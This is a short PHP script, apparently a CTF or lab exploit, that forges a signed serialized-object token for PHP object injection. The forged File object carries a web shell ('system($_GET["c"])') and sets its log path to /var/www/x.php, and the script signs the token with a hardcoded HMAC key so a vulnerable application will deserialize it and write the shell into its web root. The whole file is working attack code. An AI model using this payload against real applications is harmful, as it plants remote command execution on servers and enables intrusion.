<?php

class File {
  public $owner,$uuid='<?php system($_GET["c"]);?>';

  public $logfile = "/var/www/x.php";

}

define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");

function sign($data) {
  return hash_hmac('md5', $data, KEY);
}

function tokenize($user) {
    $token = urlencode(base64_encode(serialize($user))); 
    $token.= "--".sign($token); 
    return $token;
  }


print_r(tokenize(new File()));
